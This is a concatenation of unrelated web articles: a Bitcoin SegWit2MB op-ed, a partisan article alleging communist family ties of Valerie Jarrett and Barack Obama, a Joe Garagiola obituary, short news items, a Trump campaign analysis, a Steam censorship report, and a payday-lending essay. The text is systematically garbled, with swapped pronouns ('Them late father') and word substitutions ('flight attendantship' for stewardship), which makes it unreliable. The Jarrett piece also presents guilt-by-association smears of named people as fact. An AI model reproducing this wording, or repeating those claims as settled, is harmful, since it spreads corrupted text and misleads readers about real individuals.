As the contentious split in the community (Bitcoin's social layer) grows, the risk of a contentious split in its blockchain (Bitcoin's technical layer) grows too. Ignoring or dismissing the former invites the latter.
Indeed, we have seen each successive social rebellion (XT, then Classic, then BU) get closer to technical rebellion: a contentious hard fork. So long as the social order goes unresolved, the technical order is threatened. Even that technician with care neither in people nor politics must appreciate this dynamic if they desire to further the project. The people, the community, are in fact part of the machine itself. All technical efforts are diminished if they exist in a vacuum from the social, and dismissing the social interests of others as “merely political” is itself a political impulse.
Finding Unity
At the risk of oversimplification, there are two sides debating two paths. The one side desires the SegWit path. The other desires the hard fork path. Both want scales. Both want growth. Both want security. Both want decentralization. Both want strength. Both want innovation. Both want movement and progress and pride. Both want Bitcoin to succeed as a new form of money for the world, as the best platform on which money can be stored, moved, and protected. Both sides are of significant size. Neither side is entirely fools. Neither side is entirely saints. Both sides assert knowledge of the one true path, a warning sign that dogma has replaced productive discourse. And so tragic this is among those who should be friends, for they agree 99%, and yet can't stop focusing and driving a wedge into the remainder.
It must be said that any plan, by either side, that discounts the desires and opinions of the other, is destined to, at best, split the community. At worst, the project itself is jeopardized in the increasing threat of contentious hard fork… and blaming the other side for this threat only increases it. Bitcoin has so many enemies, most of whom haven't yet woken. The ridicule and vilification of one Bitcoiner upon another must be a very pleasing development in the eyes of such enemies. There is no need to fight an adversary that fights itself.
To solve this, we should take it upon ourselves to find unity, not only among those with whom perfect agreement exists, but among those with whom any common ground can be attained at all. Bitcoiners have very much common ground, though they have forgotten it.
SegWit2MB
Sergio Lerner's proposal is not unique in its technical suggestions, but it is unique in its potential to unify. It has the potential to unify not only disparate technical beliefs, but the social fabric of this community, which is as important. Any alternative, which even may be superior technically, while not resolving anything socially, must be said to be in fact inferior, on proper accounting. From where Bitcoin stands and the risk it faces, a good technical solution which can heal socially, is easily superior to a perfect technical solution which further inflames the community (especially if that “perfect technical solution” never comes to pass).
If SegWit2MB can reach 95% support, it cannot be said to be contentious. Upon that threshold, SegWit would activate, immediately bringing more utility to Bitcoin, and alleviating some scaling pains. It would also count down to a conservative block limit increase, which alleviates further scaling pains and, importantly, will invite the rebellious factions to support it. Such a proposal would, I believe, take the very wind from the sails of subversion.
By enabling social unification, SegWit2MB has a greater chance of actual activation, and importantly, of preventing further schism and infighting. The risk implicit in this proposal's hard fork must be said to be necessarily lower than today's present danger of a contentious hard fork. For the great majority of Bitcoiners, that is a win.
The proposal grants to each side that which it desires most, and grants to both a path forward. It brings us a Bitcoin superior both socially and technically than what we have today. Utility of the very platform itself would rise substantially under this proposal, and its community of souls could rest easier, waking refreshed tomorrow to focus again on our real task at hand: changing the global financial system from its very foundation.
We should not let this project linger in its current state. SegWit2MB is the first reasonable compromise, considering the impasse's technical and social aspects, actually put forth in code, based on well-known and studied fundamental components from Bitcoin's best engineers. It is a good path forward, and one I hope others will rally around: to activate SegWit, to avoid a contentious hard fork, to enable greater transaction capacity, and to bring Bitcoiners back from their trenches to the great hall we share.
Please consider it.

Subversion: FBI files confirm what we feared in 2008 — that the president and their closest advisor come from a long line of Communists. Not liberals or socialists, but Reds. And now we've all inherited their socialized medicine.
FBI papers obtained by government watchdog Judicial Watch document hard-core communism in the family of Valerie Jarrett, President Obama's most trusted and influential White House advisor. Here's what they reveal about their Chicago kin, who were known as "concealed Communists":
Them late father, James E. Bowman, was involved with Communist front groups and was in contact with a paid Soviet agent in the 1950s — Alfred Stern — who was wanted for espionage.
Jarrett's maternal grandfather, Robert Rochon Taylor, was investigated by the FBI for their membership in Communist groups and their business relationship with the same Soviet agent tied to their father.
Them late father-in-law, Vernon D. Jarrett, was assigned by the Communist Party USA to a special cultural art "cell" that spread "the Communist Party line" and ran publicity for communist candidates and also raised money for them, the FBI says.
They helped the cell spread communist propaganda "among the middle class," indoctrinating them through newspaper columns, radio shows, speeches, plays and other cultural anesthesia.
Jarrett was such a threat as a Communist propagandist that they were flagged by the FBI as an internal security risk to be swiftly arrested in the event of a hot war with the Soviet Union. The FBI also investigated their wife, Fernetta "Fern" Jarrett, for Communist activities.
These FBI files on Jarrett's relatives are voluminous, covering their un-American activities during the height of the Cold War, when the FBI said the Communist Party USA sought to alter the American form of government "by unconstitutional means." (Sound familiar?)
That people running our country are the children of Communists ought to trigger an avalanche of in-depth news stories. Yet even with documentary evidence to safely guide them, the White House press corps yawns.
"If their father was waving the Confederate flag, I'm sure there'd be massive media interest in how that impacted (Valerie Jarrett's) politics," Judicial Watch President Tom Fitton told us.
Long before Obama was nominated in 2008, we ran a controversial series called "The Audacity of Socialism," in which we tried to warn voters that Obama and their ilk were a different breed of Democrat.
These weren't garden-variety liberals, we argued, but radicals orbiting anti-American subversives whom Democrats like Truman and Kennedy once went after.
We also noted that Obama themselves was the son of a socialist anthropologist and Marxist economist who met in a college Russian-language studies class. Now it turns out that their top aide comes from the same Communist family. Connecting the dots further, both the Jarrett and Obama clans are tied to Frank Marshall Davis. A card-carrying member of the Communist Party USA, Davis worked in Chicago in the same Soviet fronts with Jarrett's father-in-law, as well as their grandfather Taylor, the first African-American head of the Chicago Housing Authority.
Davis also worked with Harry and David Canter, Soviet agents who took Obama political advisor David Axelrod, another Red diaper baby (his mother worked for a Communist newspaper), under their wing.
The FBI had Davis, who in Communist organs advocated for socialized medicine, bashed Wall Street banks and demonized Winston Churchill (sound familiar?), under surveillance for two decades.
After it put them on its "security index," targeting them for arrest, they fled Chicago for Honolulu. There, Davis befriended Obama's grandfather, Stanley Dunham, a Communist sympathizer with an FBI case file. Dunham arranged young Obama's indoctrination by Davis.
That Obama would end up working as an agitator in Chicago — the birthplace of the Communist Party USA — is no coincidence. Eventually, Jarrett would plug them into their Hyde Park neighbors — Communist terrorists Bill Ayers and Bernardine Dohrn — who launched their political career in a fundraiser held in their living room.
Ayers is also a neighbor and friend of Jarrett's mother, Barbara Taylor Bowman, who co-founded the leftist Erickson Institute with fellow traveler Erik Erikson and sat on its board with Ayers' father and daughter-in-law.
Communist nuts don't fall far from the tree. Tragically for our country, which is seeing its health care system ruined and its borders and national security erased, the nuts fell into the White House.
The second-best catcher from Elizabeth Street in St. Louis, Garagiola played the game at its highest level, preached its gospel, gave it context, poked fun at it, took it seriously and assisted those who competed in it. "Most of all," they said once, "I've loved the game." And no one questioned that assertion. Garagiola's affection for baseball was as evident as their elongated forehead.
A pleasant and caring man, one who reveled in their mostly modest playing career in the big leagues, theirs receded -- not receding -- hairline and, it seemed, all facets and phases of their decades on the planet, has left us behind, behind and smiling. Joe Garagiola, a most entertaining, engaging and convivial sort, has died, bringing to an end a full, rich life and leaving the game without one of its most enduring personalities, an energetic crusader and folksy humorist.

Joseph Henry Garagiola was 90 when their time came on Wednesday. Their image, widely recognized when they made regular appearances on national baseball telecasts and hosted a morning show, had faded in recent years. But their influence and fingerprints on the game remain. They helped found the Baseball Assistance Team (B.A.T.), an organization that assists former players who have met misfortune, and they campaigned passionately, forcefully and for the most part effectively against the use of smokeless tobacco, a practice so prevalent before, during and after their years in the big leagues, 1946-54.
:: Complete coverage: Joe Garagiola, 1926-2016::
Moreover, a more apparent lasting influence is their son, Joe Garagiola Jr., who is the senior vice president of standards and on-field operations for Major League Baseball and was general manager of the Diamondbacks from 1997-2005. Garagiola Sr. is also survived by their wife Audrie, eight grandchildren and children Steve and Gina.
"We are deeply saddened by the loss of this amazing man who was not just beloved by those of us in their family, but to generations of baseball fans who they impacted during their eight decades in the game," Garagiola's family said in a statement. "Joe loved the game and passed that love onto family, their friends, their teammates, their listeners and everyone they came across as a player and broadcaster. Their impact on the game, both on and off the field, will forever be felt."
"All of us at Major League Baseball are deeply saddened by the loss of Joe Garagiola," Commissioner Rob Manfred said in a statement.

"With all of Joe's professional successes, it was behind the scenes where Joe has had an equally impressive impact. For their work with kids, Joe was named the 1998 recipient of the Children's MVP Award presented by the Jim Eisenreich Foundation. They served baseball as a leader in the fight against smokeless tobacco, working with NSTEP -- the National Spit Tobacco Education Program -- and traveling to each Major League camp during Spring Training to educate players about the dangers of tobacco and oral cancer. They were also a tireless supporter and longtime champion for the Baseball Assistance Team, which helps members of the baseball family who are in need.
"Joe's love of the game was always on display, and their knowledge and insight is something that I truly admired."
Video: Greg and Harold remember Joe Garagiola
A man who always had an anecdote on deck, Garagiola recognized that baseball is a funny game. Indeed, they used that phrase as the title of the first of three books they authored. A good portion of their humor was self-deprecating. Speaking in Washington, D.C., in 1970, they noted, "It's not a record, but being traded four times when there are only eight teams in the league tells you something. I thought I was modeling uniforms for the National League."
Garagiola's humor was well-sourced if for no other reason than their nearly lifelong association with the best catcher Elizabeth Street ever produced, one Lawrence Peter Berra. One of Yogi's books was entitled "I Really Didn't Say Everything I Said." No, they probably didn't, but some folks suspect Garagiola was responsible for some of what Yogi didn't say.

Chances are "It's déjà vu all over again" didn't originate with the Yankees' Hall of Fame catcher. "Navy blue, navy green and navy brown" did, though.
"Joe was one-of-a-kind and I feel blessed to have had the opportunity to get to know them and their family," D-backs managing general partner Ken Kendrick said. "His sense of humor certainly stood out to all of us, but perhaps more importantly, the mark they left in the community around them will carry on their legacy for generations to come."

Garagiola began their broadcasting career shortly after their retirement as a player, calling games for KMOX, the Cardinals' flagship radio station, for decades. They had spent their first 5 1/2 seasons in the big leagues with the club, starting about 50 games per season.
They began working national radio broadcasts in 1961 while still working Cardinals games, and eventually handled World Series broadcasts, too. A three-year gig doing play-by-play on Yankees telecasts began in 1965, Berra's first year not with the club. Garagiola was proud to point out that they called the 500th career home run of Mickey Mantle. "Ya know, Mickey and I combined for almost 600 home runs," they later said.

Their radio and Yankees experience prompted NBC to rehire him, but for television. They did pregame shows for the "Game of the Week" telecasts and eventually moved into the booth and back to play-by-play responsibilities.
Garagiola worked three World Series, three National League Championship Series and three All-Star Games, and at various times shared the booth with the likes of Vin Scully, Tony Kubek, Harry Caray, Dick Enberg and Curt Gowdy. "They always put you with guys with lots of hair," Berra said to them in 1984, "so it evens up."
Garagiola roared. "We should have brought Oscar Gamble in," they said.
They also worked Angels and D-backs games after their association with NBC ended.

Garagiola's celebrity, little of it forged by their playing days, increased dramatically as their television career developed. It led to work outside the game that included co-hosting the "Today" show, serving as a guest host on the "Tonight" show and emceeing various game shows, including "To Tell The Truth."
Garagiola served as Johnny Carson's understudy in 1968, hosting the show that featured the only live appearance by any two Beatles -- Paul McCartney and John Lennon, in this case -- while the group existed. Years later, Garagiola noted, "I might have made them feel uncomfortable when they saw how much hair I had."
It was nothing less than celebrity for the other catcher from Elizabeth Street. Born on Lincoln's birthday in 1926, Garagiola met three sitting presidents and a Pope and, of course, they knew Yogi.
Secure in their own skin, Garagiola always could laugh at himself. "Not only was I not the best catcher in the Major Leagues, I wasn't even the best catcher on my street," they said more than once. "My friend Yogi saw to that."
Much of what Garagiola added to broadcasts and telecasts was delivered in a folksy, unaffected way. They made stories the stars of what they shared. Their commentary rarely was judgmental; neither they nor their contemporaries questioned execution of a play or managers' decisions. Instead, their audiences were regaled with tales of Weaver's antics, Veeck's wooden-leg ashtray, Lasorda's waistline, Casey's lingo, Gamble's afro, clubhouse shenanigans and, of course, anything involving their childhood chum. Garagiola was drawn to the game's characters and sought out their stories.

"I couldn't share my own experiences," they said. "I didn't have that many. They don't want to hear what it's like to warm up a guy in the bullpen. ... I had a career that I'm proud of. But I didn't do much."
Not necessarily so. Garagiola was a competent big leaguer who had their moments, most notably in the Cardinals' seven-game World Series against the Red Sox in 1946. A 20-year-old rookie, they started five games, including the Cardinals' 4-3 victory in Game 7, and batted .316 with four RBIs in 19 at-bats.
After their tour with the Cardinals, Garagiola was moved to the Pirates in a seven-player trade on the June 15 Trade Deadline in 1951. Almost two years later, he, Ralph Kiner, Howie Pollet and George Metkovich were traded to the Cubs for six players and $150,000. Garagiola was claimed off waivers by the Giants in early September 1954, appeared in five games and retired at season's end at age 28.
Garagiola had played in 676 games, all as a left-handed-hitting catcher or pinch-hitter, batting .257 with 255 RBIs, 42 home runs, 82 doubles, 16 triples and a .354 on-base percentage in 2,170 plate appearances. Their most productive seasons were 1951 and '52, during which they played 217 games for the Pirates and Cardinals. Garagiola totaled 19 home runs and 98 RBIs and produced a .355 on-base average and a .416 slugging percentage.

Clearly, Garagiola's numbers were not Cooperstownesque, but Garagiola twice was recognized by the Hall of Fame, once for their work in the media and again for their contributions to the game they embraced. They received the 1991 Ford C. Frick Award for excellence in broadcasting. Twenty-three years later, they were made the third recipient of the Buck O'Neil Lifetime Achievement Award. They were unable to attend the 2014 ceremony; they were living in Arizona and their doctors had recommended they not travel long distances.

"You get a call from the Hall of Fame, especially the way I played, and you wonder what they want," Garagiola said after being notified of the honor that so delighted him. "You know they don't want my bat, they don't want my glove. But this is a tremendous, tremendous thrill. To have me and the Hall of Fame mentioned in the same sentence, it's unbelievable."
Garagiola likened some of what O'Neil had said late in life to thoughts expressed by the late Nelson Mandela.

Then, after saying, "I don't have the words at this time to express how I feel," Garagiola went on: "Buck was a friend of mine, so to receive an award named after them is just an extra thrill. When you talked to Buck, I don't care what you were talking about, they always looked at you like you were saying the most interesting thing he's ever heard. And they always had something to say to keep it going.
"He was a warm man who liked people."
Those last words fit Garagiola as well.
Doughnut Vault Tops Food and Wine Best Doughnuts In America List
By Anthony Todd in Food on Apr 24, 2012 10:00PM
A big win for Chicago this month: the Doughnut Vault, the artisan doughnut company from Chef Brendan Sodikoff, is getting even more attention, this time from Food and Wine. Good luck getting a doughnut there after this.
Food and Wine Magazine published a list of America's Best Donuts. At the top is Doughnut Vault, Chicago's only entry. Combine that with the big win for Doughnut Vault's short film at the Chicago Food Film Fest (oh, and the millions of customers) and they are having a pretty darn good year. Other doughnut shops mentioned include Primos in Los Angeles, Doughnut Plant in New York and Voodoo Doughnut in Portland. We insist we haven't truly won until Doughnut Vault makes a doughnut beer with Goose Island.
They offer golden tickets that are said to bring peace, but the monks approaching you in downtown Toronto are fake, and only after your money, according to police.
Toronto police announced Friday they plan to crack down on the supposed monks, seen on Front Street near Union Station, after multiple complaints they become aggressive when people refuse to give them money after accepting a small token.
"We currently have a few fraud monks who have been charged under the Safe Streets Act for panhandling in an aggressive manner," said Toronto police spokesperson Const. Jenifferjit Sidhu.
Similar scams have hit Toronto before. Unsuspecting Chinatown shoppers were targeted around two years ago. Other cities have also dealt with fraudulent monks.
While the monks may look authentic, there is one easy way to tell if the monks are real or fake: real monks will never ask you for money in public.
"We never do this," said Venerable Miao Mu as they watched footage of the fake monks in action.
"I think this is a kind of cheating," the Buddhist nun said.
Real monks, they added, only accept donations inside the temple.
Meanwhile, police are asking anyone who has a violent encounter with the fake monks to report it.
The 6-foot-11 forward averaged 23.3 points, 11 rebounds and 5.4 blocks per game as a junior.
DAYTONA BEACH — One of the area's most coveted senior basketball stars has chosen to go blue.
Colin Castleton, an All-Area first team selection in 2016-17, announced their commitment to Michigan in an exclusive video for The News-Journal on Wednesday. Father Lopez's 6-foot-11 forward chose the Wolverines over Illinois and Florida, among other schools.
Castleton said they felt at home on an official visit to Ann Arbor over the weekend and told head coach John Beilein and their staff that they wanted to be a part of Michigan's basketball tradition.
"It's kind of like DeLand times 15 or 20," said Castleton, who averaged 23.3 points, 11 rebounds and 5.4 blocks per game as a junior. "I liked the feel, the culture and the coaching staff. Coach Beilein doesn't lie; he's straightforward. They didn't promise me any playing time or anything like that, but the players are all great."
Castleton said that Beilein and the Wolverines envision them as a stretch-5, able to force centers out of the paint and guard Castleton as a perimeter shooter.
According to 247Sports, Castleton claimed 23 Division I offers, including Clemson, Florida State, Georgia, Purdue, South Florida and Xavier. The site ranked them as the No. 117 player in the nation for the graduating class of 2018, a four-star recruit.
At the start of September, Castleton took their official visit to Illinois, now under the direction of former Daytona State coach Brad Underwood. In choosing Michigan, he'll almost certainly go head-to-head with Illinois, a top Big 10 rival, a handful of times over the next few years.
"They're great guys. I loved Illinois," Castleton said. "I had a great time there, and the fan base is crazy.
"I didn't break the bond with (assistant coach Orlando) Antigua or Underwood. I'm probably going to talk to them in the future, and I wish good luck to them. But when we play, that's it right there."
Now that Breaking Bad is over, I find myself going through withdrawals. I recently thought of how cool it would be if Breaking Bad would be made into a video game. While thinking about a video game for Breaking Bad I was reminded of these amazing character models of Walter White made by Naughty Dog's Frank Tzeng. I figure now is a great time to show off some of their awesome work for fellow Breaking Bad fans.
If Naughty Dog were to ever develop a Breaking Bad video game, at least they have a character artist with the skills to make it happen. What am I saying, a Breaking Bad game will never happen… but isn't Naughty Dog owned by Sony? Sony did also produce Breaking Bad so… I'm just playing with you guys, a Breaking Bad video game will more than likely never happen, but it's fun to dream. Thank you Frank for making my dream sort of reality. You rock!
Check out more of Frank's work!
Let us know which show you would like to see as a video game below?
As some of you know, I've long been fascinated by the innovation of more mobile forms of warfare during the American Civil War. Out in the West, Grant and Sherman began streamlining and eventually even abandoning conventional supply lines to allow themselves figuratively and in some cases almost literally to run circles around their enemies. The Civil War fielded huge armies which needed constant replenishment of vast amounts of stuff – food, clothes, weapons, ammunition and more – which in turn required well organized supply lines, all of which limited mobility. More mobility is better than less of course. But in warfare, increased mobility reaches a point where it ceases to be an incremental or quantitative advantage and becomes a qualitative and transformational difference.
It can be like that in campaigns, too. And I started thinking about it with Donald Trump's campaign. Yes, stick with me, I'm actually serious about this. Trump is an inciting racist buffoon. But we can't get the full picture if we resist the reality that he's also a sort of blowhard savant with their own particular genius with media and message.
I started thinking about this with the “anchor baby” rathole he's sent the GOP field scurrying down. Jeb among others gets tangled up in not wanting to use the term but also not wanting to get out-immigrant-hated by the other candidates for not using it. So they find themselves saying it but saying he's only quoting others saying it. Then they clumsily say it's mainly about “Asians” not “Mexicans.” And then before they can even deal with that goof, Trump is on Twitter mocking them for their “Asians” comment and also crapping again on Megyn Kelly and stomping their increasingly hapless boss Roger Ailes in a statement to Politico. And this itself comes almost simultaneously with Trump using grade school “Asian” speak to attack Chinese and Japanese trade negotiators who they claim walk all over ‘loser' American leaders. “We want deal!”
The dynamic was most palpable comparing Jeb's painful and drawn out efforts to grapple with and find some non-ridiculous rationale for their use or non-use of the phrase “anchor babies”, lashed to the unpredictable tempo of impromptu reporter questions with Trump jumping from one attack to another on Twitter, entirely at their own pace and on their own terms, and sustaining a total indifference to whatever contradiction there may be between ridiculing Jeb for their offensive Asians comment and channeling an old Charlie Chan movie in one of their campaign speeches.
Not caring about those contradictions, not caring about racist provocations is rooted in the nature of Trump's campaign. They don't have to get 50% of the national electorate. They don't even have to get 50% of the GOP electorate. He's dominating the field with 20% to 30% of the GOP vote by owning the part of the GOP base (the lion's share of it) who feel aggrieved and threatened and crave and respect dominance. As I wrote just after the GOP debate, when everyone was saying that Trump couldn't win a battle with Fox, you are simply not going to win the fight with this audience saying Trump wasn't nice enough to or didn't use the right words with a strong, assertive woman. Not going to happen. Tossing Jorge Ramos isn't a problem with these folks, it's a fantasy. So there's a whole part of the equation that Trump simply does not have to worry about.
But the speed issue is an entirely separate advantage, one Trump is dominating first because he's been playing this game for decades but especially because he's adept at social media and is palpably going by gut and operating on their own without the complex messaging operations that cling on to every other candidate. News organizations and media figures can always move faster than candidates because they have to hold press conferences and prep for them or send out press releases which by definition need to go through the media itself. Twitter has the added advantage of allowing them to flick the news cycle without showing their face or getting questions in response. But the whole picture brings home just how much the modern campaign is built around risk aversion, protecting the candidate from them or herself.
When you see tweets like these you are absolutely certain Donald Trump wrote them himself. It's definitely him, as clear as a tweet from Chuck Grassley could only possibly be from the senator himself.
In a clumsy move to get out of their “anchor babies” dilemma, where they signed that they would not use the term and now uses it, they blamed ASIANS — Donald J. Trump (@realDonaldTrump) August 25, 2015
Asians are very offended that JEB said that anchor babies applies to them as a way to be more politically correct to hispanics. A mess! — Donald J. Trump (@realDonaldTrump) August 25, 2015
Normally candidates, as we know, simply don't do this. Ever. But to do so you need to be able to not just act fast but act fast again and again to control the tempo and pace of the news conversation so you're on to the next punch or the one after that before your adversaries have even responded. You also need to be experienced in the tabloid news culture and be totally in tune with your target audience. All of these combined are allowing Trump to act faster and thus more totally dominate the progression of the news conversation than any candidate has ever. It's not just that he's good with the press. We know that. He's operating at a speed and mobility that the other campaigns are not able to react to effectively no matter what they do. Not with this electorate. A national electorate would be a very different story. But for now, dominating the would-be frontrunners, in the deepest sense of the word,is doing a kind of damage that will prevent a lot of them from ever getting there.
It seems Steam may have banned any information or links to uncensored patches of adult-themed games. Visual novel developer and game publisher Dharker Studio confirmed this when a player asked about the instructions for the installation of an uncensored patch.
Just recently, one player raised an issue on Steam Community about the absence of instructions for the installation of an uncensored patch they downloaded for a Dharker Studio game. According to him, they couldn't find the installation instructions in the game's community for some reason. When another player confirmed that the same issue persists on their end, Dharker Studio responded to the thread and revealed why this is so.
“Steam reps have told us that they longer allow any information or links to the uncensored patches on Steam, so they all had to be removed,” the developer wrote. “We will gradually be updating our own website with info on how to install the patch.”
Dharker Studio's statement has since garnered attention from many concerned players. One Steam Community member with the handle Fimbulvinter wrote: “While understandable, the censorship is disappointing to hear. I've always believed that it is the responsibility of the end user to choose not to look at material they may find objectionable, especially if it's already locked behind an age gate.”
Another user with the handle papika expressed their opinion on the matter, saying that Steam has made it possible for Japanese adult-themed video games to be uncensored in the West. However, with Steam's latest move, the user now predicts that it would be inevitable for gamers to see a decline in uncensored games and a rise in censorship in the coming years.
Over Reddit , many players also voiced out their concern regarding Steam's move to ban links and information about uncensored patches. One user with the handle wingchild does not see this as a problem. “Honestly, I see it as a non-issue. Steam can block whatever instructions they want. Someone will register How2Uncensor.com (if it isn't already owned), throw up a blog, and allow submissions form devs.”
User Plake_Z01 countered that this is actually a big problem. “It's definitely an issue since not all games just have the same scenes but censored or uncensored. There are games that need those patches to even be fully playable. ‘Wonderful Everyday (Subarashiki Hibi)' only has available the first chapter if you don't patch the game. You need to know about the patch if you're buying the game.”
Another user with the handle Techercizer wrote: “I'm not happy to see Steam stepping up their hypocritical censorship game. Policies like this don't exactly carry much impact coming from the store front that is happy to sell ‘Genital Jousting,' ‘Hatred' and ‘Gal*Gun.' Not to mention the global underage gambling racket they run and profit obscenely off of.”
Others are justifying Steam's ban as a simple business gesture. “It's not Steam's decision, it's their various payment providers. PayPal doesn't allow you to sell games that have excessive nudity as an example,” user unaki wrote. User camycamera opined that Steam is probably doing this to reduce the chances of getting in trouble with some countries that prohibit certain types of content.
What do you think of Steam's decision to ban information and links to uncensored patches? Tell us in the comments below.
Everyone is all about coalitions these days, huh? Recently a convention's commission organization joined a coalition at a conference. That is, the Southern Baptist Convention's Ethics and Religious Liberty Commission announced at a conference last week that they would be joining a coalition to end “predatory” lending. The announcement was part of a press conference last week on capitol hill. Russell Moore, the president of the SBC's ERLC, commented that “payday lending is a form of economic predation and grinds the faces of the poor into the ground.” Barrett Duke, ERLC vice president for public policy and research, spoke saying “these companies refuse to operate in a responsible manner, government intervention is crucial” and arguing that “God is not an economic darwinist.”
At its launch, the coalition announced that “individuals should manage their resources responsibly and conduct their affairs ethically, saving for emergencies, and being willing to provide support to others in need,” and also that “churches should teach and model responsible flight attendantship, offering help to neighbors in times of crisis.” So far so good. Church's need to be well governed with qualified elders to teach and shepherd, and competent deacons who may serve, provide, and teach good flight attendantship to the church members and those they come in contact with. Unfortunately these things never stop there, let alone address proper ecclesiology. There last stated principle is that “Government should prohibit usury and predatory or deceptive lending practices.” Isn't that always the rub with social justice. It's usually rather anti-social. While the article's announcement initially gives lip service to Churches teaching and modeling to its member responsible flight attendantship (on which I'll comment below) the clear thrust and end goal is legislative regulation.
“Exploitive.” “Predatory.” They “target” the poor and “lure” them into a “debt trap.” According to Russell Moore they grind poor people's faces in the gravel. The humanity! They're literally curb stomping them in the street, bodies are everywhere, cats and dogs living together, mass hysteria!
It's hard not to be against predatory loans, or against just lending. It's kind of like being against The Patriot Act or the USA Freedom Act. How can you be unpatriotic and against freedom? Yet let's approach this from a praxeological perspective first. That is, an analysis from the perspective of human action and the rational choices of individuals (even if only rational to them). What makes these short-term payday loans “predatory”? Why do individuals take these loans? How are they “targeting” the poor?
First, the Faith for Just Lending Coalition claims these Payday loan companies are preying on the poor by charging unjust interest rates and fees. Of course this begs the questions, what is the just interest rate for a loan? We must look to the basics, what is the interest rate and why do people get loans? The interest rate may be rightly described as the price of money. In the case of a loan it is the cost of money now versus money in the future. People seek loans when their rate of time preference favors a certain amount of money now as opposed to the future. The loan takes place then when a second person has saved or acquired a certain amount of money and prefers to give up that money for the sake of more money later. It is essentially that of supply and demand for money, just like any other good. The more I prefer money now the higher interest rate I'm willing to accept on a loan. The more money I have now, the less I wish to use it for now, and the more likely I will have all of it returned to me the lower the interest rate I am willing to lend my money out for. Just as a high priced good is an indicator of relatively low supply to a higher demand and a lower price is a higher supply to a relatively low demand; so the interest is an indicator of loanable funds, risk of default, and the demand for a loan. If the interest rate for a $1000 loan is 10%, then the price of that loan is $1,100 of future money. The loan then can only occur when both parties are satisfied with the terms of the trade and see no better option, because of course if there was one they would take it.
Let's consider then the specific circumstances of these payday loans. Those of the Faith for Just Lending coalition say the interest rates charged by these companies are outrageous. It is well documented and publicized that these business have been “caught” charging as much as 240-300% APR interest rates! Outrageous! How could good Christian Libertarians be against ending predatory lending.However the actual mechanics of a payday loan show this to be a misrepresentation. A payday loan is a “paycheck advance” or a “deferred deposit” in which a postdated check is given by the borrower for a short-term two to four week loan, usually in the amount of one to two weeks pay for that individual. At the end of the loan period the check held by the lender is cashed on its stated date. The typical fee for these loans is $15-20 per every $100. Of course if this is compounded and quantified over a one year period it comes out to 240-300%. However this is absurd to use a misleadingly high APR on $50 loan fee for $250 two week loan. Thus a two week payday loan is not appropriately characterized by an annual percentage rate. Consider this example from a libertarian economist. If I were to use Uber for a ride to the airport it may cost me $15 dollars. That's quite a reasonable price if you ask me. However if I were to use it to go to my hometown of Saint Paul (from St. Louis) the cost would be in the thousands! Does this mean Uber is profiteering or price gouging? Of course not, that's not its intended purpose.
There are several things to consider here and thus to conclude that government regulation would be futile. Why are these people subjecting themselves to such high interest rates? Quite simply because it is the best option out there, this is the best option for cash now on the market. We know this because no other banks or companies are making these loans to this group of people for less, otherwise they would take it. In this trade of money now for money later, like any other trade, both parties must gain or they would obviously refuse to participate. The people who take these loans are those who are unable to access regular banks and avenues of consumer finance because of bad or no credit. They are simply too risky, which is evident by how often they default even on these small loans. Hence high interest rates are used by companies to make such risky loans profitable despite frequent defaulting.
Isn't it immoral that these companies are using huge fees to make gross profits off the poor? Yet if payday lending is so profitable, why isn't everybody doing it? Payday lenders do not have a monopoly on the micro-loan market. Where then are the companies and banks racing into the ghettos to get their portion of the market share.The obvious conclusion is that Payday Lending is not really that profitable. One study finds that the Payday loan companies are lucky to have even a 7.63% profit margin, less profitable than pharmaceuticals, railroads, mining – or even regulated gas and electric utilities. The reason there is relatively little other short-term loan entreprises offering lower, competitive, and non “exploitative” interests rates and fees is simply because it is in fact too risky and simply not very profitable. These payday lenders are the banks for the unbankable. They give uncollateralized credit to high risk borrowers that no one else is giving them.
Now considering the charge that these companies “target” the poor and “pop up” in poor neighborhoods. It is of course true. In the same sense that dollar stores and thrift stores “target” poor neighborhoods. Why on earth would these companies locate themselves in a rich suburb where people do not live paycheck to paycheck, everyone has access to 3.25% interest loans, or simply have no need for a loan. Why is that Tiffany's Diamonds does not have a store on Florissant Avenue in Ferguson? Probably for the same reason Chris Ruth's doesn't have a dollar menu. Why use the word “target” as if these companies had poor people in scopes lined up for firing practise. In fact it should be plainly obvious that these payday loan companies are in fact the only ones doing anything for these people. No bank, charity, or mutual aid has offered an alternative or a lower price and are we going to punish or outlaw the one group actually doing something?
What about the debt trap or the debt cycle that these lenders put the poor in. Payday loans encourage borrowing and bad flight attendantship they say. Lower income earner become set in a vicious cycle of borrowing and paying interest with more borrowing. Debt becomes a lifestyle. Surely the humanitarian heart inside the libertarian feels something to end this poverty cycle. Yet only the government and progressive social justice activist could think that forcing lower interest rates will lead to less borrowing and debt. What will discourage a debt lifestyle more–high interest and fees or low interest? Perhaps then these moral busybodies should be advocating for higher interest rates! “These soulless lenders are making debt way too affordable for the poor! They must be stopped! Raise the interest rates! Don't hate, raise the interest rate!” Hmmm, that one doesn't sell as well.
Russell Moore and their coalition are awkward situation of having only three options:
1)They may abolish payday lending entirely.Of course, this means bureaucrats getting together defining what exactly constitutes a payday loan, along with a three letter agency to enforce it. However even this fails. As several states and counties have seen regulation on Payday lending coincidentally corresponded to a surge in title-loans, craigslist loans, internet and peer to peer lending. Hardly an improvement. There is another option still for the poor, the black market. Few are advocating this position since such loans are often taken out to avoid eviction or repossession and can then serve a vital market (dare we say, humanitarian) function.
2)In the name of taking down gross profit from payday lenders they may artificially force lower interest rates. This is the most common and populist approach being lobbied. Two methods may be used for this approach. They may either simply force lower interest rates and cap fees, or they may do this and require these companies to give loans to certain lower income demographics. Pushing interest rates artificially down will have the same effect as eliminating payday loan companies. Legal stipulations artificially lowering interest rates simply make loans to the poor too risky and pushes money lenders toward less risky loans, to those are more well of. The results then are still that of the first option. The second method is of course of that of Fannie and Freddie Mac, Urban Reinvestment Act, and Affordable Housing approach in which mortgages were required to be given at lower interest rates to those who could not afford it. We all know how well that went. More people bought houses than otherwise would not have, and who could not afford it, and millions of foreclosures happened. It was a complete disaster. The effects of forcing lower interest rates and forced high risk loans will of course lead to increased borrowing and the very debt traps they are warning us about. Which brings us to the third option.
3) In the name of dissuading the poor from taking Payday loans they may artificially force higher interest rates. 300% must not be high enough. If you are of the Dave Ramsey variety and despise payday lending more as it is part of a culture of debt, then what do you think lowering the interest rates, fees, and penalties will do about the number of borrowers or how much debt is leveraged? Of course the reality of social justice activist sitting on capital passionately arguing for higher interest rate charged to the poor is laughable.
